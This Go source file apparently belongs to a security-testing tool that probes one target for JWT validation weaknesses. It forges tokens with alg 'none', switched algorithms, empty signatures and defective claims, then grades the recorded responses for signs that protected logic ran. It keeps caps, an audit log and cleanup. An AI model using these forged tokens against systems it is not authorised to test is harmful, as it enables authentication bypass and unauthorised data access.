// Package task runs a controlled battery of token validation probes against one
// target: it builds the case matrix from a captured sample, keeps every case on
// its own marker, records the single response observed per case and turns that
// response into an evidence backed outcome.
package task

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"sort"
	"strings"
	"sync"
)

// Case kinds in the probe matrix.
const (
	CaseAlgorithm = "algorithm"
	CaseClaim     = "claim"
	CaseSignature = "signature"
)

// Case states kept by the prober.
const (
	CaseOpen      = "open"
	CaseSubmitted = "submitted"
	CaseJudged    = "judged"
	CaseCleaned   = "cleaned"
	CaseVoid      = "void"
)

const (
	groupAlgorithm = "alg"
	groupClaim     = "claim"
	groupSignature = "sig"

	classSignature = "signature_replacement"
	classClaim     = "claim_defect"

	evidenceProtectedFlag  = "protected_logic_confirmed"
	evidenceBusinessBody   = "protected_business_payload"
	evidenceRejectedStatus = "rejected_http_status"
	evidenceAuthBody       = "auth_error_body"
	evidenceNoProof        = "no_protected_logic_evidence"

	snapshotFormat  = "gsb-jwt-confusion-snapshot"
	snapshotVersion = 1
)

// Errors reported by the prober.
var (
	ErrBadSample        = errors.New("sample token is incomplete")
	ErrCaseLimit        = errors.New("case matrix exceeds the per target cap")
	ErrBatchInFlight    = errors.New("a batch is still open for this target")
	ErrTargetLimit      = errors.New("too many targets are tracked")
	ErrUnknownTarget    = errors.New("unknown target")
	ErrUnknownCase      = errors.New("unknown case")
	ErrAlreadySubmitted = errors.New("case already has a response")
	ErrNotSubmitted     = errors.New("case has no response yet")
	ErrNotJudged        = errors.New("case is not judged yet")
	ErrCaseClosed       = errors.New("case is closed")
	ErrTokenVoid        = errors.New("case token is void")
	ErrBadSnapshot      = errors.New("snapshot payload is invalid")
)

// Token is one captured token of the target.
type Token struct {
	Target    string
	Alg       string
	Header    string
	Payload   string
	Signature string
	Claims    []string
}

// Case is one probe in the matrix.
type Case struct {
	ID     string
	Target string
	Kind   string
	Name   string
	State  string
}

// Matrix is the whole probe battery of one target.
type Matrix struct {
	Target string
	Cases  []Case
}

// Response is the single observation collected for one case.
type Response struct {
	Status    int
	Body      string
	Protected bool
}

// Outcome is the judged result of one case.
type Outcome struct {
	CaseID   string
	Hit      bool
	Evidence string
	Reason   string
}

// Limits bounds the probe battery.
type Limits struct {
	MaxCasesPerTarget int
	MaxTargets        int
}

type probeSpec struct {
	group string
	kind  string
	name  string
}

type auditEvent struct {
	CaseID   string `json:"case_id"`
	Action   string `json:"action"`
	Detail   string `json:"detail,omitempty"`
	Redacted bool   `json:"redacted,omitempty"`
}

type caseState struct {
	id       string
	targetID string
	kind     string
	name     string
	group    string
	state    string
	target   *targetState

	token   *Token
	resp    *Response
	outcome *Outcome
}

type targetState struct {
	mu      sync.Mutex
	id      string
	sample  Token
	batchID string
	active  bool
	dead    bool

	cases []*caseState
	byID  map[string]*caseState

	tokenCache    map[string]Token
	responseCache map[string]Response
	evidenceCache map[string]Outcome
	audit         []auditEvent
}

// JwtConfusionProber owns the case tables of every tracked target.
type JwtConfusionProber struct {
	mu        sync.RWMutex
	limits    Limits
	targets   map[string]*targetState
	caseIndex map[string]*caseState
	batchSeq  uint64
}

// NewJwtConfusionProber builds a prober with the given caps.
func NewJwtConfusionProber(limits Limits) *JwtConfusionProber {
	return &JwtConfusionProber{
		limits:    limits,
		targets:   make(map[string]*targetState),
		caseIndex: make(map[string]*caseState),
	}
}

// Enumerate builds the probe matrix of one target from a captured sample.
func (p *JwtConfusionProber) Enumerate(sample Token) (Matrix, error) {
	normalized, specs, err := buildProbeSpecs(sample)
	if err != nil {
		return Matrix{}, err
	}
	if len(specs) > p.limits.MaxCasesPerTarget {
		return Matrix{}, ErrCaseLimit
	}

	p.mu.Lock()
	defer p.mu.Unlock()
	p.ensureMapsLocked()

	old, exists := p.targets[normalized.Target]
	if exists {
		old.mu.Lock()
		defer old.mu.Unlock()
		if old.active {
			return Matrix{}, ErrBatchInFlight
		}
		for _, oldCase := range old.cases {
			delete(p.caseIndex, oldCase.id)
		}
		old.dead = true
	} else if len(p.targets) >= p.limits.MaxTargets {
		return Matrix{}, ErrTargetLimit
	}

	p.batchSeq++
	target := newTargetState(normalized, fmt.Sprintf("batch-%016x", p.batchSeq), specs)
	for _, probeCase := range target.cases {
		p.caseIndex[probeCase.id] = probeCase
	}
	p.targets[normalized.Target] = target
	return target.matrix(), nil
}

// Craft returns the probe token of one case.
func (p *JwtConfusionProber) Craft(caseID string) (Token, error) {
	target, probeCase, err := p.locateCase(caseID)
	if err != nil {
		return Token{}, err
	}
	defer target.mu.Unlock()

	switch probeCase.state {
	case CaseCleaned:
		return Token{}, ErrCaseClosed
	case CaseVoid:
		return Token{}, ErrTokenVoid
	}

	if probeCase.token == nil {
		token := buildProbeToken(target.sample, target.batchID, probeCase)
		probeCase.token = &token
	}
	token := cloneToken(*probeCase.token)
	target.tokenCache[caseID] = cloneToken(token)
	target.audit = append(target.audit, auditEvent{
		CaseID: caseID,
		Action: "craft",
		Detail: "token_issued",
	})
	return token, nil
}

// Submit records the single response observed for one case.
func (p *JwtConfusionProber) Submit(caseID string, resp Response) error {
	target, probeCase, err := p.locateCase(caseID)
	if err != nil {
		return err
	}
	defer target.mu.Unlock()

	if probeCase.state == CaseCleaned || probeCase.state == CaseVoid {
		return ErrCaseClosed
	}
	if probeCase.resp != nil || probeCase.outcome != nil ||
		probeCase.state == CaseSubmitted || probeCase.state == CaseJudged {
		return ErrAlreadySubmitted
	}

	recorded := resp
	probeCase.resp = &recorded
	probeCase.state = CaseSubmitted
	target.responseCache[caseID] = resp
	target.audit = append(target.audit, auditEvent{
		CaseID: caseID,
		Action: "submit",
		Detail: fmt.Sprintf("status_%d", resp.Status),
	})
	return nil
}

// Judge turns the recorded response of one case into an outcome.
func (p *JwtConfusionProber) Judge(caseID string) (Outcome, error) {
	target, probeCase, err := p.locateCase(caseID)
	if err != nil {
		return Outcome{}, err
	}
	defer target.mu.Unlock()

	if probeCase.outcome != nil {
		return *probeCase.outcome, nil
	}
	if probeCase.resp == nil {
		return Outcome{}, ErrNotSubmitted
	}
	if probeCase.state == CaseVoid || probeCase.state == CaseCleaned {
		return Outcome{}, ErrCaseClosed
	}

	outcome := judgeResponse(probeCase, *probeCase.resp)
	probeCase.outcome = &outcome
	probeCase.state = CaseJudged
	target.evidenceCache[caseID] = outcome
	target.audit = append(target.audit, auditEvent{
		CaseID: caseID,
		Action: "judge",
		Detail: outcome.Evidence,
	})
	return outcome, nil
}

// Cleanup closes one judged case.
func (p *JwtConfusionProber) Cleanup(caseID string) error {
	target, probeCase, err := p.locateCase(caseID)
	if err != nil {
		return err
	}
	defer target.mu.Unlock()

	if probeCase.state == CaseCleaned {
		purgeDerived(target, caseID)
		return nil
	}
	if probeCase.outcome == nil {
		return ErrNotJudged
	}

	purgeDerived(target, caseID)
	probeCase.token = nil
	probeCase.resp = nil
	probeCase.state = CaseCleaned
	target.audit = append(target.audit, auditEvent{
		CaseID: caseID,
		Action: "cleanup",
		Detail: "derived_data_redacted",
	})
	if batchComplete(target) {
		target.active = false
	}
	return nil
}

// CleanupAll closes every case of a target and reports how many were closed.
func (p *JwtConfusionProber) CleanupAll(targetID string) (int, error) {
	target, err := p.lockTarget(targetID)
	if err != nil {
		return 0, err
	}
	defer target.mu.Unlock()

	for _, probeCase := range target.cases {
		purgeDerived(target, probeCase.id)
		probeCase.token = nil
		if probeCase.outcome != nil {
			probeCase.resp = nil
			probeCase.state = CaseCleaned
			continue
		}
		probeCase.resp = nil
		probeCase.state = CaseVoid
	}

	target.tokenCache = make(map[string]Token)
	target.responseCache = make(map[string]Response)
	target.evidenceCache = make(map[string]Outcome)
	target.active = false
	target.audit = append(target.audit, auditEvent{
		CaseID: targetID,
		Action: "cleanup_all",
		Detail: "all_derived_data_redacted",
	})
	return len(target.cases), nil
}

// Close drops the case table of a target and frees its slot.
func (p *JwtConfusionProber) Close(targetID string) error {
	p.mu.Lock()
	target, ok := p.targets[targetID]
	if !ok {
		p.mu.Unlock()
		return ErrUnknownTarget
	}
	delete(p.targets, targetID)
	for _, probeCase := range target.cases {
		delete(p.caseIndex, probeCase.id)
	}
	p.mu.Unlock()

	target.mu.Lock()
	defer target.mu.Unlock()
	target.dead = true
	target.active = false
	for _, probeCase := range target.cases {
		probeCase.token = nil
		probeCase.resp = nil
		probeCase.outcome = nil
	}
	target.cases = nil
	target.byID = nil
	target.tokenCache = nil
	target.responseCache = nil
	target.evidenceCache = nil
	target.audit = nil
	return nil
}

// Cases lists the cases of one target in matrix order.
func (p *JwtConfusionProber) Cases(targetID string) []Case {
	target, err := p.lockTarget(targetID)
	if err != nil {
		return nil
	}
	defer target.mu.Unlock()
	return target.matrix().Cases
}

// Progress reports how many cases are judged out of the whole matrix.
func (p *JwtConfusionProber) Progress(targetID string) (done, total int) {
	target, err := p.lockTarget(targetID)
	if err != nil {
		return 0, 0
	}
	defer target.mu.Unlock()

	for _, probeCase := range target.cases {
		if probeCase.outcome != nil {
			done++
		}
	}
	return done, len(target.cases)
}

// Snapshot serialises the case tables and their progress.
func (p *JwtConfusionProber) Snapshot() ([]byte, error) {
	p.mu.RLock()
	defer p.mu.RUnlock()
	p.ensureMapsLocked()

	data := snapshotData{
		Version:  snapshotVersion,
		Limits:   p.limits,
		BatchSeq: p.batchSeq,
		Targets:  make([]snapshotTarget, 0, len(p.targets)),
	}
	targetIDs := make([]string, 0, len(p.targets))
	for targetID := range p.targets {
		targetIDs = append(targetIDs, targetID)
	}
	sort.Strings(targetIDs)

	for _, targetID := range targetIDs {
		target := p.targets[targetID]
		target.mu.Lock()
		item := snapshotTarget{
			ID:      target.id,
			Sample:  target.sample,
			BatchID: target.batchID,
			Active:  target.active,
			Cases:   make([]snapshotCase, 0, len(target.cases)),
		}
		for _, probeCase := range target.cases {
			saved := snapshotCase{
				ID:       probeCase.id,
				TargetID: probeCase.targetID,
				Kind:     probeCase.kind,
				Name:     probeCase.name,
				Group:    probeCase.group,
				State:    probeCase.state,
			}
			if probeCase.token != nil {
				token := cloneToken(*probeCase.token)
				saved.Token = &token
			}
			if probeCase.resp != nil {
				resp := *probeCase.resp
				saved.Response = &resp
			}
			if probeCase.outcome != nil {
				outcome := *probeCase.outcome
				saved.Outcome = &outcome
			}
			item.Cases = append(item.Cases, saved)
		}
		data.Targets = append(data.Targets, item)
		target.mu.Unlock()
	}

	payload, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	checksum := sha256.Sum256(payload)
	file := snapshotFile{
		Format:   snapshotFormat,
		Payload:  payload,
		Checksum: hex.EncodeToString(checksum[:]),
	}
	return json.Marshal(file)
}

// Restore replaces the case tables with a snapshot, all or nothing.
func (p *JwtConfusionProber) Restore(data []byte) error {
	restored, batchSeq, err := decodeSnapshot(data, p.limits)
	if err != nil {
		return err
	}

	p.mu.Lock()
	defer p.mu.Unlock()
	p.ensureMapsLocked()
	for _, old := range p.targets {
		old.mu.Lock()
		old.dead = true
		old.mu.Unlock()
	}
	p.targets = restored.targets
	p.caseIndex = restored.caseIndex
	if batchSeq > p.batchSeq {
		p.batchSeq = batchSeq
	}
	return nil
}

type restoredState struct {
	targets   map[string]*targetState
	caseIndex map[string]*caseState
}

type snapshotFile struct {
	Format   string          `json:"format"`
	Payload  json.RawMessage `json:"payload"`
	Checksum string          `json:"checksum"`
}

type snapshotData struct {
	Version  int              `json:"version"`
	Limits   Limits           `json:"limits"`
	BatchSeq uint64           `json:"batch_seq"`
	Targets  []snapshotTarget `json:"targets"`
}

type snapshotTarget struct {
	ID      string         `json:"id"`
	Sample  Token          `json:"sample"`
	BatchID string         `json:"batch_id"`
	Active  bool           `json:"active"`
	Cases   []snapshotCase `json:"cases"`
}

type snapshotCase struct {
	ID       string    `json:"id"`
	TargetID string    `json:"target_id"`
	Kind     string    `json:"kind"`
	Name     string    `json:"name"`
	Group    string    `json:"group"`
	State    string    `json:"state"`
	Token    *Token    `json:"token,omitempty"`
	Response *Response `json:"response,omitempty"`
	Outcome  *Outcome  `json:"outcome,omitempty"`
}

func (p *JwtConfusionProber) ensureMapsLocked() {
	if p.targets == nil {
		p.targets = make(map[string]*targetState)
	}
	if p.caseIndex == nil {
		p.caseIndex = make(map[string]*caseState)
	}
}

func (p *JwtConfusionProber) locateCase(caseID string) (*targetState, *caseState, error) {
	p.mu.RLock()
	probeCase := p.caseIndex[caseID]
	p.mu.RUnlock()
	if probeCase == nil || probeCase.target == nil {
		return nil, nil, ErrUnknownCase
	}

	target := probeCase.target
	target.mu.Lock()
	if target.dead || target.byID[caseID] != probeCase {
		target.mu.Unlock()
		return nil, nil, ErrUnknownCase
	}
	return target, probeCase, nil
}

func (p *JwtConfusionProber) lockTarget(targetID string) (*targetState, error) {
	p.mu.RLock()
	target := p.targets[targetID]
	p.mu.RUnlock()
	if target == nil {
		return nil, ErrUnknownTarget
	}
	target.mu.Lock()
	if target.dead {
		target.mu.Unlock()
		return nil, ErrUnknownTarget
	}
	return target, nil
}

func buildProbeSpecs(sample Token) (Token, []probeSpec, error) {
	targetID := strings.TrimSpace(sample.Target)
	alg := strings.TrimSpace(sample.Alg)
	if targetID == "" || alg == "" {
		return Token{}, nil, ErrBadSample
	}

	claims := make([]string, 0, len(sample.Claims))
	seen := make(map[string]struct{}, len(sample.Claims))
	for _, claim := range sample.Claims {
		name := strings.TrimSpace(claim)
		if name == "" {
			return Token{}, nil, ErrBadSample
		}
		if _, ok := seen[name]; ok {
			continue
		}
		seen[name] = struct{}{}
		claims = append(claims, name)
	}

	sample.Target = targetID
	sample.Alg = alg
	sample.Claims = claims
	specs := []probeSpec{
		{group: groupAlgorithm, kind: CaseAlgorithm, name: "none"},
		{group: groupAlgorithm, kind: CaseAlgorithm, name: "hs256"},
		{group: groupAlgorithm, kind: CaseAlgorithm, name: "rs256"},
	}
	for _, claim := range claims {
		specs = append(specs, probeSpec{group: groupClaim, kind: CaseClaim, name: claim})
	}
	specs = append(specs, probeSpec{group: groupSignature, kind: CaseSignature, name: "empty"})
	return sample, specs, nil
}

func newTargetState(sample Token, batchID string, specs []probeSpec) *targetState {
	target := &targetState{
		id:            sample.Target,
		sample:        sample,
		batchID:       batchID,
		active:        true,
		byID:          make(map[string]*caseState, len(specs)),
		tokenCache:    make(map[string]Token),
		responseCache: make(map[string]Response),
		evidenceCache: make(map[string]Outcome),
	}
	for _, spec := range specs {
		id := caseID(sample.Target, spec.group, spec.name)
		probeCase := &caseState{
			id:       id,
			targetID: sample.Target,
			kind:     spec.kind,
			name:     spec.name,
			group:    spec.group,
			state:    CaseOpen,
			target:   target,
		}
		target.cases = append(target.cases, probeCase)
		target.byID[id] = probeCase
	}
	return target
}

func caseID(targetID, group, name string) string {
	return targetID + "/" + group + "/" + name
}

func (target *targetState) matrix() Matrix {
	matrix := Matrix{
		Target: target.id,
		Cases:  make([]Case, 0, len(target.cases)),
	}
	for _, probeCase := range target.cases {
		matrix.Cases = append(matrix.Cases, Case{
			ID:     probeCase.id,
			Target: probeCase.targetID,
			Kind:   probeCase.kind,
			Name:   probeCase.name,
			State:  probeCase.state,
		})
	}
	return matrix
}

func cloneToken(token Token) Token {
	if token.Claims != nil {
		token.Claims = append([]string(nil), token.Claims...)
	}
	return token
}

func buildProbeToken(sample Token, batchID string, probeCase *caseState) Token {
	alg := sample.Alg
	signature := forgedSignature(batchID, probeCase.id)

	switch probeCase.group {
	case groupAlgorithm:
		alg = probeCase.name
		if probeCase.name == "none" {
			signature = ""
		}
	case groupSignature:
		signature = ""
	}

	return Token{
		Target:    probeCase.targetID,
		Alg:       alg,
		Header:    rewriteHeader(sample.Header, alg),
		Payload:   rewritePayload(sample.Payload, batchID, probeCase),
		Signature: signature,
		Claims:    append([]string(nil), sample.Claims...),
	}
}

func forgedSignature(batchID, id string) string {
	raw := "gsb-controlled-forgery:" + batchID + ":" + id
	return base64.RawURLEncoding.EncodeToString([]byte(raw))
}

func decodeJWTSection(section string) ([]byte, error) {
	for _, encoding := range []*base64.Encoding{
		base64.RawURLEncoding,
		base64.URLEncoding,
		base64.RawStdEncoding,
		base64.StdEncoding,
	} {
		if decoded, err := encoding.DecodeString(section); err == nil {
			return decoded, nil
		}
	}
	return nil, errors.New("invalid base64 JWT section")
}

func rewriteHeader(rawHeader, alg string) string {
	values := make(map[string]any)
	if rawHeader != "" {
		if decoded, err := decodeJWTSection(rawHeader); err == nil {
			_ = json.Unmarshal(decoded, &values)
		}
	}
	values["alg"] = alg
	if _, ok := values["typ"]; !ok {
		values["typ"] = "JWT"
	}
	encoded, _ := json.Marshal(values)
	return base64.RawURLEncoding.EncodeToString(encoded)
}

func rewritePayload(rawPayload, batchID string, probeCase *caseState) string {
	values := make(map[string]any)
	if rawPayload != "" {
		if decoded, err := decodeJWTSection(rawPayload); err == nil {
			_ = json.Unmarshal(decoded, &values)
		}
	}
	values["gsb_batch"] = batchID
	values["gsb_case"] = probeCase.id
	if probeCase.group == groupClaim {
		applyClaimDefect(values, probeCase.name)
	}
	encoded, _ := json.Marshal(values)
	return base64.RawURLEncoding.EncodeToString(encoded)
}

func applyClaimDefect(values map[string]any, claim string) {
	switch claim {
	case "exp":
		values[claim] = 1
	case "nbf", "iat":
		values[claim] = int64(9999999999)
	case "iss":
		values[claim] = "gsb-invalid-issuer"
	case "aud":
		values[claim] = "gsb-invalid-audience"
	case "sub":
		values[claim] = "gsb-invalid-subject"
	case "jti":
		values[claim] = "gsb-invalid-jti"
	default:
		values[claim] = "gsb-invalid-" + claim
	}
}

func judgeResponse(probeCase *caseState, resp Response) Outcome {
	class := conclusionClass(probeCase)
	if rejected, evidence := authRejection(resp); rejected {
		return Outcome{
			CaseID:   probeCase.id,
			Hit:      false,
			Evidence: class + ":" + evidence,
			Reason:   class + ": target rejected the probe before protected business logic ran",
		}
	}
	if !reachedProtectedLogic(resp) {
		return Outcome{
			CaseID:   probeCase.id,
			Hit:      false,
			Evidence: class + ":" + evidenceNoProof,
			Reason:   fmt.Sprintf("%s: status alone does not prove protected business logic ran (status=%d)", class, resp.Status),
		}
	}

	proof := evidenceBusinessBody
	if resp.Protected {
		proof = evidenceProtectedFlag
	}
	return Outcome{
		CaseID:   probeCase.id,
		Hit:      true,
		Evidence: class + ":" + proof,
	}
}

func conclusionClass(probeCase *caseState) string {
	if probeCase.kind == CaseClaim {
		return classClaim
	}
	return classSignature
}

func authRejection(resp Response) (bool, string) {
	if resp.Status == 401 || resp.Status == 403 || resp.Status == 407 {
		return true, evidenceRejectedStatus
	}
	body := strings.ToLower(resp.Body)
	for _, marker := range []string{
		"unauthorized",
		"forbidden",
		"access denied",
		"authentication required",
		"login required",
		"invalid token",
		"token rejected",
		"token expired",
		"expired token",
		"invalid signature",
		"signature invalid",
		"signature verification failed",
	} {
		if strings.Contains(body, marker) {
			return true, evidenceAuthBody
		}
	}
	return false, ""
}

func reachedProtectedLogic(resp Response) bool {
	if resp.Status >= 400 {
		return false
	}
	if resp.Protected {
		return true
	}
	return bodyHasBusinessProof(resp.Body)
}

func bodyHasBusinessProof(body string) bool {
	normalized := strings.ToLower(body)
	for _, marker := range []string{
		"account-list",
		"account_list",
		"accountlist",
		"protected-data",
		"protected_data",
		"business-data",
		"business_data",
		"order-list",
		"order_list",
		"user-profile",
		"user_profile",
		"admin-panel",
		"admin_panel",
	} {
		if strings.Contains(normalized, marker) {
			return true
		}
	}
	return false
}

func purgeDerived(target *targetState, caseID string) {
	delete(target.tokenCache, caseID)
	delete(target.responseCache, caseID)
	delete(target.evidenceCache, caseID)
	for index := range target.audit {
		if target.audit[index].CaseID == caseID {
			target.audit[index].Detail = "[redacted]"
			target.audit[index].Redacted = true
		}
	}
}

func batchComplete(target *targetState) bool {
	for _, probeCase := range target.cases {
		if probeCase.state != CaseCleaned && probeCase.state != CaseVoid {
			return false
		}
	}
	return true
}

func decodeSnapshot(raw []byte, limits Limits) (restoredState, uint64, error) {
	var file snapshotFile
	if err := json.Unmarshal(raw, &file); err != nil {
		return restoredState{}, 0, ErrBadSnapshot
	}
	if file.Format != snapshotFormat || file.Checksum == "" || len(file.Payload) == 0 {
		return restoredState{}, 0, ErrBadSnapshot
	}
	checksum := sha256.Sum256(file.Payload)
	if !strings.EqualFold(file.Checksum, hex.EncodeToString(checksum[:])) {
		return restoredState{}, 0, ErrBadSnapshot
	}

	var data snapshotData
	if err := json.Unmarshal(file.Payload, &data); err != nil || data.Version != snapshotVersion {
		return restoredState{}, 0, ErrBadSnapshot
	}

	state := restoredState{
		targets:   make(map[string]*targetState),
		caseIndex: make(map[string]*caseState),
	}
	if limits.MaxTargets <= 0 || len(data.Targets) > limits.MaxTargets {
		if len(data.Targets) > 0 {
			return restoredState{}, 0, ErrBadSnapshot
		}
	}

	for _, savedTarget := range data.Targets {
		if _, exists := state.targets[savedTarget.ID]; exists {
			return restoredState{}, 0, ErrBadSnapshot
		}
		sample, specs, err := buildProbeSpecs(savedTarget.Sample)
		if err != nil || savedTarget.ID != sample.Target || savedTarget.BatchID == "" {
			return restoredState{}, 0, ErrBadSnapshot
		}
		if limits.MaxCasesPerTarget <= 0 || len(specs) > limits.MaxCasesPerTarget {
			return restoredState{}, 0, ErrBadSnapshot
		}
		if len(savedTarget.Cases) != len(specs) {
			return restoredState{}, 0, ErrBadSnapshot
		}

		target := &targetState{
			id:            sample.Target,
			sample:        sample,
			batchID:       savedTarget.BatchID,
			byID:          make(map[string]*caseState, len(specs)),
			tokenCache:    make(map[string]Token),
			responseCache: make(map[string]Response),
			evidenceCache: make(map[string]Outcome),
		}

		for index, savedCase := range savedTarget.Cases {
			spec := specs[index]
			id := caseID(sample.Target, spec.group, spec.name)
			if savedCase.ID != id || savedCase.TargetID != sample.Target ||
				savedCase.Kind != spec.kind || savedCase.Group != spec.group ||
				savedCase.Name != spec.name {
				return restoredState{}, 0, ErrBadSnapshot
			}
			if _, exists := state.caseIndex[id]; exists {
				return restoredState{}, 0, ErrBadSnapshot
			}

			stateName, token, resp, outcome, err := restoreCaseProgress(savedCase)
			if err != nil {
				return restoredState{}, 0, ErrBadSnapshot
			}
			probeCase := &caseState{
				id:       id,
				targetID: sample.Target,
				kind:     spec.kind,
				name:     spec.name,
				group:    spec.group,
				state:    stateName,
				target:   target,
				token:    token,
				resp:     resp,
				outcome:  outcome,
			}
			target.cases = append(target.cases, probeCase)
			target.byID[id] = probeCase
			state.caseIndex[id] = probeCase
		}
		target.active = !batchComplete(target)
		state.targets[target.id] = target
	}

	return state, data.BatchSeq, nil
}

func restoreCaseProgress(saved snapshotCase) (string, *Token, *Response, *Outcome, error) {
	switch saved.State {
	case CaseOpen:
		if saved.Response != nil || saved.Outcome != nil {
			return "", nil, nil, nil, ErrBadSnapshot
		}
		return CaseVoid, nil, nil, nil, nil
	case CaseSubmitted:
		if saved.Response == nil || saved.Outcome != nil {
			return "", nil, nil, nil, ErrBadSnapshot
		}
		return CaseSubmitted, saved.Token, saved.Response, nil, nil
	case CaseJudged:
		if saved.Response == nil || saved.Outcome == nil {
			return "", nil, nil, nil, ErrBadSnapshot
		}
		outcome := *saved.Outcome
		return CaseJudged, saved.Token, saved.Response, &outcome, nil
	case CaseCleaned:
		if saved.Outcome == nil {
			return "", nil, nil, nil, ErrBadSnapshot
		}
		outcome := *saved.Outcome
		return CaseCleaned, nil, nil, &outcome, nil
	case CaseVoid:
		if saved.Outcome != nil {
			return "", nil, nil, nil, ErrBadSnapshot
		}
		return CaseVoid, nil, nil, nil, nil
	default:
		return "", nil, nil, nil, ErrBadSnapshot
	}
}
